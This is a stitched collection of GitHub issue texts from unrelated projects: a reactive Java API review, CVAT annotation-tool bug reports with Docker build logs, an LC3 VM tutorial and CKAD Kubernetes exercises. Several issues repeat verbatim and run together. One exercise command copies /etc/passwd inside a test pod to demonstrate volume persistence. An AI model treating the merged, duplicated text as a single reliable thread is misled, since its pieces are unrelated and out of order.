        // Ignored.
    }

    @Override
    public void cancel() {
        // Ignored.
    }
}
```
So this is not a problem that will impact customers as far as I can tell - just really picky TCKs!

I will have a rummage about in the code to see if I can see a good fix but not today most likely. The doc section related to the Error Management Operators is just a repetion of the previous Action  Operators section.
It doesn't describe the mentioned  onErroResume, onErrorResumeWith, onErrorResumeWithRsPublisher. Even the pictures are wrong.  We need to configure the CI to enforce the implementation works on different Java version.
Typically Java 8 and Java 11 need to be checked.  Just happened to notice that 1.0.5 was tagged with the root project artifactId instead of the `tagNameFormat` field.

Was this release done through Semaphore?

Just wondering what might have changed Just happened to notice that 1.0.5 was tagged with the root project artifactId instead of the `tagNameFormat` field.

Was this release done through Semaphore?

Just wondering what might have changed Emmanuel is a noob in reactive things. Feel free to ignore the proposals that are not possible for fundamental reasons.

## Types

I hate packages with the name `api`.

`UniSubscriber` and `UniSubscription` do not receive nor return `Uni` in their signature. Can we therefore have generic `Subscriber` / `Subscription`? We can have a prefix to differentiate them from others like Rx, I'm arguying for a unified Uni and Multi Subscription types.
Are they used by normal people? If no, maybe put them in a sub package. 

`Disposable` does not seem to be used from a user PoV (from the tests I am seeing), do we really need it? In the main package?

## Methods

https://github.com/smallrye/smallrye-reactive-streams-operators/blob/features/POC-Uni/implementation/src/main/java/io/smallrye/reactive/streams/api/UniEmitter.java#L28
Is it common enough to call `success()` to warrant an extra method exposed?

I personally find `asFoo()` more natural to read than `toFoo()`. I don't know if there is a strong reason to use `to`.

https://github.com/smallrye/smallrye-reactive-streams-operators/blob/features/POC-Uni/implementation/src/main/java/io/smallrye/reactive/streams/api/Uni.java#L271
I'd rename `CompletableFuture<T> subscribeToCompletionStage();` to `CompletableFuture<T> subscribeAndConvertToCompletableFuture();`
While `toFoo()` might be readable (though I find `asFoo` more readable), `subscribeTo` changes the meaning.

https://github.com/smallrye/smallrye-reactive-streams-operators/blob/features/POC-Uni/implementation/src/main/java/io/smallrye/reactive/streams/api/Uni.java#L163
I'm not super clear what it defers to from the javdoc, nor when I would want to use it.

https://github.com/smallrye/smallrye-reactive-streams-operators/blob/features/POC-Uni/implementation/src/main/java/io/smallrye/reactive/streams/api/Uni.java#L350
I don't understand what that one does.

https://github.com/smallrye/smallrye-reactive-streams-operators/blob/features/POC-Uni/implementation/src/main/java/io/smallrye/reactive/streams/api/Uni.java#L377
When do you plan to use this one? Having to pass a function instance seems annoying at first value compared to a static `Converter.class` of sort.


## Wild proposals


* Replace `fromPublisher(Publisher<T>)` and `fromPublisher(PublisherBuilder)` with:
    * either 1. `Uni<T> from(Class<T extends Converter>).foo(Foo<T>)` used like `Uni<String> Uni.from(PublisherConverter.class).publisher(publisher); where `publisher(P...)` is a specific method driven directly or indirectly by the `PublisherConverter`.
        * Examples of APIs using this pattern is https://github.com/beanvalidation/beanvalidation-api/blob/master/src/main/java/javax/validation/Validation.java#L63 https://github.com/beanvalidation/beanvalidation-api/blob/master/src/main/java/javax/validation/Validation.java#L152 https://github.com/beanvalidation/beanvalidation-api/blob/master/src/main/java/javax/validation/spi/ValidationProvider.java#L26 (I think it can be simplified for our use case though)
    * or 2. `Uni<T> from().publisher(Publisher)` `Uni<T> from().publisher(PublisherBuilder)` where these methods are "hardcoded" in the return type of `from()`
        * This makes for an easier usage for the known type to convert from.
        * We can have a `from(Class<T extends Converter>)` (see option 1) for types "unknown" like Rx1, Rx2, Reactor etc
    * or 3. (variant of 2.) `fromPublisher().with(Publisher<T>)`, `fromPublisher().with(PublisherBuilder<T>)`, `fromConverter(Class<T extends Converter>)`
    * The idea is to reduce the methods displayed by the IDE and be extensible for each of these alternatives
    
* Same for `fromOptional`

* Replace `failed(Throwable)` and `failed(Supplier)` with `failing().with(Throwable)` and `failing().with(Supplier)`
    * The idea is to reduce the methods displayed by the IDE

* Replace `subscribe(UniSubscriber)` `UniSubscription subscribe(Consumer, Consumer)` and `CompletableFuture<T> subscribeToCompletionStage()` with
    * `subscribe().withSubscriber`, `subscribe().withCallbacks`, `subscribe().andReturnCompletableFuture()`

* Replace `block*` with `block().indefinitely()`, `block().withDuration()`, `block().andReturnOptional()`

Note that all this design does not requires several implementations, `DefaultUni` can implement all these types returned by `subscribe()`, `from()` etc and `this` is returned.

TODO (Emmanuel):

1. Look at and discuss `to`.
2. Consider doing the method aggregation pattern for operators like `or().else()`, `retry`, `on().error().return()` etc
3. Also offer a generic operator extension model based on the uni from(Converter) proposal above (Bean Validator pattern).

## Details

https://github.com/smallrye/smallrye-reactive-streams-operators/blob/features/POC-Uni/implementation/src/main/java/io/smallrye/reactive/streams/api/UniEmitter.java#L6
=> s/single signals/single signal/

https://github.com/smallrye/smallrye-reactive-streams-operators/blob/features/POC-Uni/implementation/src/main/java/io/smallrye/reactive/streams/api/Uni.java#L37
=> s/being subscribed to the specified value if/being subscribed to with the specified value if/

https://github.com/smallrye/smallrye-reactive-streams-operators/blob/features/POC-Uni/implementation/src/main/java/io/smallrye/reactive/streams/api/Uni.java#L84
=> s/If it's not the case the subscriber's callbacks/If it's not the case, the subscriber's callbacks/

## Implementation detail

It's useful to have `UniFailed` `UniOf` etc, vs a generic Uni impl and passing the behavior as lambdas in the constructor? Emmanuel is a noob in reactive things. Feel free to ignore the proposals that are not possible for fundamental reasons.

## Types

I hate packages with the name `api`.

`UniSubscriber` and `UniSubscription` do not receive nor return `Uni` in their signature. Can we therefore have generic `Subscriber` / `Subscription`? We can have a prefix to differentiate them from others like Rx, I'm arguying for a unified Uni and Multi Subscription types.
Are they used by normal people? If no, maybe put them in a sub package. 

`Disposable` does not seem to be used from a user PoV (from the tests I am seeing), do we really need it? In the main package?

## Methods

https://github.com/smallrye/smallrye-reactive-streams-operators/blob/features/POC-Uni/implementation/src/main/java/io/smallrye/reactive/streams/api/UniEmitter.java#L28
Is it common enough to call `success()` to warrant an extra method exposed?

I personally find `asFoo()` more natural to read than `toFoo()`. I don't know if there is a strong reason to use `to`.

https://github.com/smallrye/smallrye-reactive-streams-operators/blob/features/POC-Uni/implementation/src/main/java/io/smallrye/reactive/streams/api/Uni.java#L271
I'd rename `CompletableFuture<T> subscribeToCompletionStage();` to `CompletableFuture<T> subscribeAndConvertToCompletableFuture();`
While `toFoo()` might be readable (though I find `asFoo` more readable), `subscribeTo` changes the meaning.

https://github.com/smallrye/smallrye-reactive-streams-operators/blob/features/POC-Uni/implementation/src/main/java/io/smallrye/reactive/streams/api/Uni.java#L163
I'm not super clear what it defers to from the javdoc, nor when I would want to use it.

https://github.com/smallrye/smallrye-reactive-streams-operators/blob/features/POC-Uni/implementation/src/main/java/io/smallrye/reactive/streams/api/Uni.java#L350
I don't understand what that one does.

https://github.com/smallrye/smallrye-reactive-streams-operators/blob/features/POC-Uni/implementation/src/main/java/io/smallrye/reactive/streams/api/Uni.java#L377
When do you plan to use this one? Having to pass a function instance seems annoying at first value compared to a static `Converter.class` of sort.


## Wild proposals


* Replace `fromPublisher(Publisher<T>)` and `fromPublisher(PublisherBuilder)` with:
    * either 1. `Uni<T> from(Class<T extends Converter>).foo(Foo<T>)` used like `Uni<String> Uni.from(PublisherConverter.class).publisher(publisher); where `publisher(P...)` is a specific method driven directly or indirectly by the `PublisherConverter`.
        * Examples of APIs using this pattern is https://github.com/beanvalidation/beanvalidation-api/blob/master/src/main/java/javax/validation/Validation.java#L63 https://github.com/beanvalidation/beanvalidation-api/blob/master/src/main/java/javax/validation/Validation.java#L152 https://github.com/beanvalidation/beanvalidation-api/blob/master/src/main/java/javax/validation/spi/ValidationProvider.java#L26 (I think it can be simplified for our use case though)
    * or 2. `Uni<T> from().publisher(Publisher)` `Uni<T> from().publisher(PublisherBuilder)` where these methods are "hardcoded" in the return type of `from()`
        * This makes for an easier usage for the known type to convert from.
        * We can have a `from(Class<T extends Converter>)` (see option 1) for types "unknown" like Rx1, Rx2, Reactor etc
    * or 3. (variant of 2.) `fromPublisher().with(Publisher<T>)`, `fromPublisher().with(PublisherBuilder<T>)`, `fromConverter(Class<T extends Converter>)`
    * The idea is to reduce the methods displayed by the IDE and be extensible for each of these alternatives
    
* Same for `fromOptional`

* Replace `failed(Throwable)` and `failed(Supplier)` with `failing().with(Throwable)` and `failing().with(Supplier)`
    * The idea is to reduce the methods displayed by the IDE

* Replace `subscribe(UniSubscriber)` `UniSubscription subscribe(Consumer, Consumer)` and `CompletableFuture<T> subscribeToCompletionStage()` with
    * `subscribe().withSubscriber`, `subscribe().withCallbacks`, `subscribe().andReturnCompletableFuture()`

* Replace `block*` with `block().indefinitely()`, `block().withDuration()`, `block().andReturnOptional()`

Note that all this design does not requires several implementations, `DefaultUni` can implement all these types returned by `subscribe()`, `from()` etc and `this` is returned.

TODO (Emmanuel):

1. Look at and discuss `to`.
2. Consider doing the method aggregation pattern for operators like `or().else()`, `retry`, `on().error().return()` etc
3. Also offer a generic operator extension model based on the uni from(Converter) proposal above (Bean Validator pattern).

## Details

https://github.com/smallrye/smallrye-reactive-streams-operators/blob/features/POC-Uni/implementation/src/main/java/io/smallrye/reactive/streams/api/UniEmitter.java#L6
=> s/single signals/single signal/

https://github.com/smallrye/smallrye-reactive-streams-operators/blob/features/POC-Uni/implementation/src/main/java/io/smallrye/reactive/streams/api/Uni.java#L37
=> s/being subscribed to the specified value if/being subscribed to with the specified value if/

https://github.com/smallrye/smallrye-reactive-streams-operators/blob/features/POC-Uni/implementation/src/main/java/io/smallrye/reactive/streams/api/Uni.java#L84
=> s/If it's not the case the subscriber's callbacks/If it's not the case, the subscriber's callbacks/

## Implementation detail

It's useful to have `UniFailed` `UniOf` etc, vs a generic Uni impl and passing the behavior as lambdas in the constructor? Otherwise it suggests there's something more general to it. The doc section related to the Error Management Operators is just a repetion of the previous Action  Operators section.
It doesn't describe the mentioned  onErroResume, onErrorResumeWith, onErrorResumeWithRsPublisher. Even the pictures are wrong. 
<---------->
139060470
Can't login (and thus can't submit an entry).
After authenticating the Telegram account nothing is happening.

*OS*: MacOS Mojave 10.14
*Browser*: Chrome - Version 71.0.3578.98 (Official Build) (64-bit)

Bot is authenticated:
<img src="https://user-images.githubusercontent.com/11582927/51042420-eddd7e00-15c4-11e9-8efc-cf2ea7f8a0b2.png" width="400"/>

Issue demo:
![ezgif-2-350f96e51feb](https://user-images.githubusercontent.com/11582927/51042409-e322e900-15c4-11e9-968a-fa60f9740e3f.gif)

<---------->
139156354
Please bear with my question. I am new to ubuntu and stuck with an error.

First of all thank you guys for building a wonderful tool. I was able to test it and it was awesome. I am trying to access the url from another system and with the help of stackoverflow post i came to know that we need to run manage.py.

If i run manage.py i am getting the below error..
File "manage.py", line 17, in <module>
    "Couldn't import Django. Are you sure it's installed and "
ImportError: Couldn't import Django. Are you sure it's installed and available on your PYTHONPATH environment variable? Did you forget to activate a virtual environment?

I feel like it is a silly question for you guys. kindly bear with me.

Thanks,
Ravi Hi, 
There is no information what's the progress of uploading annotation. Sometimes it took very long time and it can be confusing for the user. The only option how to check the status is to watch active job in queues or the upload button is gray. 
BW,
karellat My openvino model is imported and working properly for small dataset. However, when I select a large image dataset i.e.  than > 500 images, Annotation completed 100% but at the end I get this error" Annotation has failed". I tried to use segment size = 200 and overlap to compress data... but it did not help.  Hello everyone :)

I uploaded own model to CVAT, I made task with video and I used auto annotation.
In my case I have video with 126 frames, and model recognized total 925 boxes.
When I use dump annotation "CVAT XML 1.1 for images", everything looks ok and logically.
But when I use "CVAT XML 1.1 for video", I don't understand how works the naming of track Id in dumped xml file, because in opened task in CVAT's window I see another numbers. Total number of tracks is the same like in the CVAT's task window (925).

I supposed that was a problem with incorrect dumping annotation, but I made a test. I added new task with the same video and uploaded annotation. Boxes are on correct places so it means that CVAT understand this naming.

Numbers of track are from 0 to 924, but numbers in task's window ale from 1 to 925. I see that numbers of tracks are totally disagree with numbers of instances in task's window. They aren't even in close proximity to each other. Track with id = 916 on frame 49, can have BB on instance id = 123 on frame 49. Only frame is the same.

How it works? Hello I am new to CVAT, I use openvino to run auto annotation, I want to use YoloV3 for this mission in CVAT. I converted Yolo model to OpenVINO format and created xml and bin files.
Now I need to write interpretation python script for Yolo's region based output. How can I do that?
Is there an interrupt file from tensorflow models to openvino? It would be nice to extend the documentation with examples of interpretation script for segmentation models:
https://github.com/opencv/open_model_zoo/tree/master/intel_models/road-segmentation-adas-0001
https://github.com/opencv/open_model_zoo/blob/master/intel_models/instance-segmentation-security-0010/description/instance-segmentation-security-0010.md In order to use the function of auto annotaion, I had to supply a label map(*.json) file. I want to use the model from open-model-zoo, but I only download *.xml and *.bin, how I can get the label map file? TAG: Question
I want to add more properties to project like validator name and tags to each image which will reflect back in XML output.
I will change the model.py to accommodate the changes.
Anywhere else I have to change to add the extra values.
 At least we need to know a timestamp of the latest save for each job. 
Now REST API doesn't provide any information about it. 

Probably it would be useful provide another information like a name of a user who has done the latest save, comments, etc.  I try to install cvat on ubuntu 18.04. but the installation procedure faild at this point

Successfully built 6589b39062ca
Successfully tagged cvat:latest
Building cvat_ui
Step 1/17 : FROM ubuntu:18.04 AS cvat-ui
 ---> 7698f282e524
Step 2/17 : ARG http_proxy
 ---> Using cache
 ---> 7363be2f907b
Step 3/17 : ARG https_proxy
 ---> Using cache
 ---> fd397f6e388f
Step 4/17 : ARG no_proxy
 ---> Using cache
 ---> 95720115074b
Step 5/17 : ARG socks_proxy
 ---> Using cache
 ---> 54760755446b
Step 6/17 : ENV TERM=xterm     http_proxy=${http_proxy}       https_proxy=${https_proxy}     no_proxy=${no_proxy}     socks_proxy=${socks_proxy}
 ---> Using cache
 ---> 2dfc665d1b08
Step 7/17 : ENV LANG='C.UTF-8'      LC_ALL='C.UTF-8'
 ---> Using cache
 ---> fc0b353e2ba2
Step 8/17 : RUN apt update && apt install -yq nodejs npm curl &&     npm install -g n && n 10.16.3
 ---> Running in 327556caa49b

WARNING: apt does not have a stable CLI interface. Use with caution in scripts.

Get:1 http://security.ubuntu.com/ubuntu bionic-security InRelease [88.7 kB]
Get:2 http://archive.ubuntu.com/ubuntu bionic InRelease [242 kB]
Get:3 http://archive.ubuntu.com/ubuntu bionic-updates InRelease [88.7 kB]
Get:4 http://security.ubuntu.com/ubuntu bionic-security/universe amd64 Packages [766 kB]
Get:5 http://archive.ubuntu.com/ubuntu bionic-backports InRelease [74.6 kB]
Get:6 http://archive.ubuntu.com/ubuntu bionic/multiverse amd64 Packages [186 kB]
Get:7 http://archive.ubuntu.com/ubuntu bionic/main amd64 Packages [1344 kB]
Get:8 http://security.ubuntu.com/ubuntu bionic-security/multiverse amd64 Packages [4957 B]
Get:9 http://security.ubuntu.com/ubuntu bionic-security/restricted amd64 Packages [7802 B]
Get:10 http://security.ubuntu.com/ubuntu bionic-security/main amd64 Packages [640 kB]
Get:11 http://archive.ubuntu.com/ubuntu bionic/restricted amd64 Packages [13.5 kB]
Get:12 http://archive.ubuntu.com/ubuntu bionic/universe amd64 Packages [11.3 MB]
Get:13 http://archive.ubuntu.com/ubuntu bionic-updates/restricted amd64 Packages [19.0 kB]
Get:14 http://archive.ubuntu.com/ubuntu bionic-updates/universe amd64 Packages [1284 kB]
Ign:15 http://archive.ubuntu.com/ubuntu bionic-updates/main amd64 Packages
Get:16 http://archive.ubuntu.com/ubuntu bionic-updates/multiverse amd64 Packages [8000 B]
Get:17 http://archive.ubuntu.com/ubuntu bionic-backports/main amd64 Packages [2496 B]
Get:18 http://archive.ubuntu.com/ubuntu bionic-backports/universe amd64 Packages [4212 B]
Get:15 http://archive.ubuntu.com/ubuntu bionic-updates/main amd64 Packages [944 kB]
Err:15 http://archive.ubuntu.com/ubuntu bionic-updates/main amd64 Packages
  File has unexpected size (944475 != 944473). Mirror sync in progress? [IP: 91.189.88.175 80]
  Hashes of expected file:
   - Filesize:944473 [weak]
   - SHA256:788d8f45d75965dd2488c7e7544abf405cda2d344e1aafd52173605a87545c6b
   - SHA1:77c8a594b696d2b4c1b57d648b67ab3805fac60d [weak]
   - MD5Sum:8526e702a621000576befde8d0c18dc1 [weak]
  Release file created at: Tue, 10 Sep 2019 08:16:28 +0000
Fetched 16.1 MB in 13s (1256 kB/s)
Reading package lists...
E: Failed to fetch http://archive.ubuntu.com/ubuntu/dists/bionic-updates/main/binary-amd64/Packages.gz  File has unexpected size (944475 != 944473). Mirror sync in progress? [IP: 91.189.88.175 80]
   Hashes of expected file:
    - Filesize:944473 [weak]
    - SHA256:788d8f45d75965dd2488c7e7544abf405cda2d344e1aafd52173605a87545c6b
    - SHA1:77c8a594b696d2b4c1b57d648b67ab3805fac60d [weak]
    - MD5Sum:8526e702a621000576befde8d0c18dc1 [weak]
   Release file created at: Tue, 10 Sep 2019 08:16:28 +0000
E: Some index files failed to download. They have been ignored, or old ones used instead.
ERROR: Service 'cvat_ui' failed to build: The command '/bin/sh -c apt update && apt install -yq nodejs npm curl &&     npm install -g n && n 10.16.3' returned a non-zero code: 100 List of attribute name is looks like random in xml as follows.

```
<image height="3648" width="5472" name="car01.JPG" id="0">
<box occluded="0" ybr="2099.93" xbr="1640.76" ytl="1574.92" xtl="919.91" label="container">
<attribute name="manufacture">bmw</attribute>
<attribute name="color">red</attribute>
<attribute name="weather">cloudy</attribute>
<attribute name="size">2</attribute>
</box>
</image>
-<image height="3648" width="5472" name="car02.JPG" id="1">
-<box occluded="0" ybr="2141.60" xbr="2953.27" ytl="1549.92" xtl="2144.93" label="container">
<attribute name="color">red</attribute>
<attribute name="size">2</attribute>
<attribute name="weather">cloudy</attribute>
<attribute name="manufacture">bmw</attribute>
 ```

Do you know attribute name is sorted by alphabetical order in xml ? List of attribute name is looks like random in xml as follows.

-<image height="3648" width="5472" name="car01.JPG" id="0">
-<box occluded="0" ybr="2099.93" xbr="1640.76" ytl="1574.92" xtl="919.91" label="container">
<attribute name="manufacture">bmw</attribute>
<attribute name="color">red</attribute>
<attribute name="weather">cloudy</attribute>
<attribute name="size">2</attribute>
</box>
</image>
-<image height="3648" width="5472" name="car02.JPG" id="1">
-<box occluded="0" ybr="2141.60" xbr="2953.27" ytl="1549.92" xtl="2144.93" label="container">
<attribute name="color">red</attribute>
<attribute name="size">2</attribute>
<attribute name="weather">cloudy</attribute>
<attribute name="manufacture">bmw</attribute>
 
Do you know attribute name is sorted by alphabetical order in xml ? Hi!
Thanks a lot for your CVAT, it is extremely helpful.
I would like to know: do you have a tool for a mask subtraction from another one? This opportunity would make life of annotators much easier. For example, they would be able to choose whole road and then adjust its contour by subtracting all cars masks from it. 

 Hi!
Thanks a lot for your CVAT, it is extremely helpful.
I would like to know: do you have a tool for a mask subtraction from another one? This opportunity would make life of annotators much easier. For example, they would be able to choose whole road and then adjust its contour by subtracting all cars masks from it. 

 The idea here would be fire an event that can be caught in a custom Django plugin. One idea would be to use [Django Signals](https://docs.djangoproject.com/en/2.2/topics/signals/).

A use case for this would be that when an annotator dumps annotations, we can then create and push a new version of the annotations up to S3 or GCS or in our case our datasets. $ docker-compose -f docker-compose.yml -f docker-compose.override.yml -f components/analytics/docker-compose.analytics.yml -f components/cuda/docker-compose.cuda.yml -f components/openvino/docker-compose.openvino.yml -f cvat/apps/dextr_segmentation/docker-compose.dextr.yml up -d --build


WARNING: The no_proxy variable is not set. Defaulting to a blank string.
WARNING: The http_proxy variable is not set. Defaulting to a blank string.
WARNING: The https_proxy variable is not set. Defaulting to a blank string.
Building cvat
Step 1/48 : FROM ubuntu:16.04
 ---> 5e13f8dd4c1a
Step 2/48 : ARG http_proxy
 ---> Using cache
 ---> 281b3d6f81e3
Step 3/48 : ARG https_proxy
 ---> Using cache
 ---> 58aff67e3fec
Step 4/48 : ARG no_proxy
 ---> Using cache
 ---> 98a839e1d880
Step 5/48 : ARG socks_proxy
 ---> Using cache
 ---> 601b2210c391
Step 6/48 : ENV TERM=xterm     http_proxy=${http_proxy}       https_proxy=${https_proxy}     no_proxy=${no_proxy}     socks_proxy=${socks_proxy}
 ---> Using cache
 ---> a2b35cfc99c4
Step 7/48 : ENV LANG='C.UTF-8'      LC_ALL='C.UTF-8'
 ---> Using cache
 ---> dc5d74dfda5d
Step 8/48 : ARG USER
 ---> Using cache
 ---> 55fc0a46c0cd
Step 9/48 : ARG DJANGO_CONFIGURATION
 ---> Using cache
 ---> 0d358b9de58e
Step 10/48 : ENV DJANGO_CONFIGURATION=${DJANGO_CONFIGURATION}
 ---> Using cache
 ---> 8aeb1e3b9bc4
Step 11/48 : RUN apt-get update &&     apt-get install -yq         python-software-properties         software-properties-common         wget &&     add-apt-repository ppa:mc3man/xerus-media -y &&     add-apt-repository ppa:mc3man/gstffmpeg-keep -y &&     apt-get update &&     DEBIAN_FRONTEND=noninteractive apt-get install -yq         apache2         apache2-dev         libapache2-mod-xsendfile         supervisor         ffmpeg         gstreamer0.10-ffmpeg         libldap2-dev         libsasl2-dev         python3-dev         python3-pip         unzip         unrar         p7zip-full         vim &&     add-apt-repository --remove ppa:mc3man/gstffmpeg-keep -y &&     add-apt-repository --remove ppa:mc3man/xerus-media -y &&     rm -rf /var/lib/apt/lists/*
 ---> Using cache
 ---> e48180d07efe
Step 12/48 : ENV USER=${USER}
 ---> Using cache
 ---> 3d8c49f764dc
Step 13/48 : ENV HOME /home/${USER}
 ---> Using cache
 ---> 80b3507f7f2d
Step 14/48 : WORKDIR ${HOME}
 ---> Using cache
 ---> a0b93e921feb
Step 15/48 : RUN adduser --shell /bin/bash --disabled-password --gecos "" ${USER}
 ---> Using cache
 ---> 13b10634685e
Step 16/48 : COPY components /tmp/components
 ---> Using cache
 ---> 18626abec2b9
Step 17/48 : ARG CUDA_SUPPORT
 ---> Using cache
 ---> bf0deaf8966b
Step 18/48 : ENV CUDA_SUPPORT=${CUDA_SUPPORT}
 ---> Using cache
 ---> 08e1210c1920
Step 19/48 : RUN if [ "$CUDA_SUPPORT" = "yes" ]; then         /tmp/components/cuda/install.sh;     fi
 ---> Running in 60a76af9ac3c
Executing: /tmp/tmp.D46u6I0xDm/gpg.1.sh --fetch-keys
http://developer.download.nvidia.cn/compute/cuda/repos/ubuntu1604/x86_64/7fa2af80.pub
gpg: key 7FA2AF80: public key "cudatools <cudatools@nvidia.com>" imported
gpg: Total number processed: 1
gpg:               imported: 1  (RSA: 1)
cudasign.pub: OK
```_E: Malformed entry 1 in list file /etc/apt/sources.list.d/cuda.list (Suite)
E: The list of sources could not be read.
ERROR: Service 'cvat' failed to build: The command '/bin/sh -c if [ "$CUDA_SUPPORT" = "yes" ]; then         /tmp/components/cuda/install.sh;     fi' returned a non-zero code: 100_```
 First of all, very impressive work,

I wanted to know if you could implement a watershed segmentation option, a little bit like that:

[https://github.com/abreheret/PixelAnnotationTool](url)

the main backend function is simply watershed from opencv

it would be needed to add a "brushing" interaction with the canvas and a button to run the watershedding missing : ppa:mc3man/xerus-media
![Screenshot from 2019-08-05 17-45-18](https://user-images.githubusercontent.com/19545163/62464013-20d9a000-b7a9-11e9-9259-1d7e6d1e73fc.png)
 editing 'docker-compose.override.yml' for 'share' is not available for win10 editing 'docker-compose.override.yml' for 'share' is not available for win10
<---------->
139217211
Hi!
First, thanks for the guide, I enjoyed it :smiley: I am wondering if there are test-images or something that extensively test if things are implemented correctly? The code I came up with does not match your example code exactly and I'd like to see if would make a difference in a hypothetical "compliance test suite". Hi, good job on your guide of VM implementation!

Maybe there's an error in section LDI?
```
// the value of far_data is an address
// of course far_data itself (the location in memory containing the address) has an address
char* far_data = "apple";

// In memory it may be layed out like this:

// Address Label      Value
// 0x123:  far_data = 0x456
// ...
// 0x456:  string   = 'a'

// if PC was at 0x100
// LDI R0 0x023
// would load 'a' into R0
```

Should the last 2 lines be:
```
// LDI R0 0x123
// would load 'a' into R0
```
? Hi there! Thank you for your great work!
BTW, I've noticed a little typo. If it is, can I submit PR?
>  it can understand a machine language which you can you can use to program it.
https://github.com/justinmeiners/lc3-vm/blob/master/index.lit#L41 Hi there! Thank you for your great work!
BTW, I've noticed a little typo. If it is, can I submit PR?
>  it can understand a machine language which you can you can use to program it.
https://github.com/justinmeiners/lc3-vm/blob/master/index.lit#L41
<---------->
139306584
Hello,

It seems the namespace is not defined into yaml.
Maybe we could add 

```
kubectl create -f pod.yaml -n mynamespace
```

Thanks a lot ! i dosent work like this: "--image=dgkanatsios/simpleapp"

the tag is missing: "--image=dgkanatsios/simpleapp:2.0" i dosent work like this: "--image=dgkanatsios/simpleapp"

the tag is missing: "--image=dgkanatsios/simpleapp:2.0" I'm doing the State Persistence exercises, and when it comes to having two pods both accessing the same PersistentVolumeClaim, I can't see `/etc/foo/passwd` from the second pod. All the steps up to that point seem to work fine, and my YAML files look the same.    
pv.yaml
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
  name: myvolume
spec:
  accessModes: [ReadWriteOnce,ReadWriteMany]
  capacity:
    storage: 10Gi
  hostPath:
    path: /etc/foo
  storageClassName: normal
```
pvc.yaml
```yaml
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: mypvc
spec:
  storageClassName: normal
  accessModes: [ReadWriteOnce]
  resources:
    requests:
      storage: 4Gi
```
```
$ kubectl get pvc
NAME    STATUS   VOLUME     CAPACITY   ACCESS MODES   STORAGECLASS   AGE
mypvc   Bound    myvolume   10Gi       RWO,RWX        normal         30m

$ kubectl get pv myvolume 
NAME       CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS   CLAIM               STORAGECLASS   REASON   AGE
myvolume   10Gi       RWO,RWX        Retain           Bound    mynamespace/mypvc   normal                  34m
```

pod.yaml
```yaml
apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    run: busysleep
  name: busysleep
spec:
  containers:
  - args:
    - sleep
    - "3600"
    image: busybox
    name: busysleep
    resources: {}
    volumeMounts:
    - mountPath: /etc/foo
      name: myvol
  dnsPolicy: ClusterFirst
  restartPolicy: Never
  volumes:
  - name: myvol
    persistentVolumeClaim:
      claimName: mypvc
status: {}
```

```
$ kubectl exec busysleep -it -- cp /etc/passwd /etc/foo/passwd
$ kubectl exec busysleep -it -- ls /etc/foo
passwd
```

Then change `pod.yaml` to have `metadata.name = busysleep2` with nothing else changed and create it.

```
$ kubectl exec busysleep2 -it -- ls /etc/foo
```
No output from the above command.

Am I missing something? I'm doing the State Persistence exercises, and when it comes to having two pods both accessing the same PersistentVolumeClaim, I can't see `/etc/foo/passwd` from the second pod. All the steps up to that point seem to work fine, and my YAML files look the same.    
pv.yaml
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
  name: myvolume
spec:
  accessModes: [ReadWriteOnce,ReadWriteMany]
  capacity:
    storage: 10Gi
  hostPath:
    path: /etc/foo
  storageClassName: normal
```
pvc.yaml
```yaml
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: mypvc
spec:
  storageClassName: normal
  accessModes: [ReadWriteOnce]
  resources:
    requests:
      storage: 4Gi
```
```
$ kubectl get pvc
NAME    STATUS   VOLUME     CAPACITY   ACCESS MODES   STORAGECLASS   AGE
mypvc   Bound    myvolume   10Gi       RWO,RWX        normal         30m

$ kubectl get pv myvolume 
NAME       CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS   CLAIM               STORAGECLASS   REASON   AGE
myvolume   10Gi       RWO,RWX        Retain           Bound    mynamespace/mypvc   normal                  34m
```

pod.yaml
```yaml
apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    run: busysleep
  name: busysleep
spec:
  containers:
  - args:
    - sleep
    - "3600"
    image: busybox
    name: busysleep
    resources: {}
    volumeMounts:
    - mountPath: /etc/foo
      name: myvol
  dnsPolicy: ClusterFirst
  restartPolicy: Never
  volumes:
  - name: myvol
    persistentVolumeClaim:
      claimName: mypvc
status: {}
```

```
$ kubectl exec busysleep -it -- cp /etc/passwd /etc/foo/passwd
$ kubectl exec busysleep -it -- ls /etc/foo
passwd
```

Then change `pod.yaml` to have `metadata.name = busysleep2` with nothing else changed and create it.

```
$ kubectl exec busysleep2 -it -- ls /etc/foo
```
No output from the above command.

Am I missing something? # My Environment

```bash
$ kubectl version
Client Version: version.Info{Major:"1", Minor:"14", GitVersion:"v1.14.8", GitCommit:"211047e9a1922595eaa3a1127ed365e9299a6c23", GitTreeState:"clean", BuildDate:"2019-10-15T12:11:03Z", GoVersion:"go1.12.10", Compiler:"gc", Platform:"darwin/amd64"}
Server Version: version.Info{Major:"1", Minor:"14+", GitVersion:"v1.14.8-gke.12", GitCommit:"188432a69210ca32cafded81b4dd1c063720cac0", GitTreeState:"clean", BuildDate:"2019-11-07T19:27:01Z", GoVersion:"go1.12.11b4", Compiler:"gc", Platform:"linux/amd64"}
```

# Overview
https://github.com/dgkanatsios/CKAD-exercises/blob/master/a.core_concepts.md#get-this-pods-yaml-without-cluster-specific-information

```bash
$ kubectl get pods nginx-xxxxxx-xxxxxx -o yaml --export
Flag --export has been deprecated, This flag is deprecated and will be removed in future.
...
```

As far as I examined, it seems there is no alternative solution. Would you say that if you're able to solve this problems within a reasonable time, you are well prepared for the CKAD? I don't have rights to submit a new branch and PR to your repo, so here are the details:

### Create a second pod (deployed to the same node the first pod is on) which is identical with the one you just created (you can easily do it by changing the 'name' property on pod.yaml). Connect to it and verify that '/etc/foo' contains the 'passwd' file. Delete pods to cleanup

<details><summary>show</summary>
<p>

Create the second pod, called busybox2:

```bash
# get details about the first pod
# take the node name from the 7th column
# remove the title/header line
# add a label to that node
kubectl get pods busybox -o wide | awk '{print $7}' | grep -v NODE | xargs -I{} kubectl label node {} use=thisone
vim pod.yaml
# change 'metadata.name: busybox' to 'metadata.name: busybox2'
# add a nodeSelector with the same label as the node to the yaml
kubectl create -f pod.yaml
kubectl exec busybox2 -- ls /etc/foo # will show 'passwd'
# cleanup
kubectl delete po busybox busybox2
``` In the exercise for applying a network policy, the command a busybox without the label also return nginx home page. 

```sh
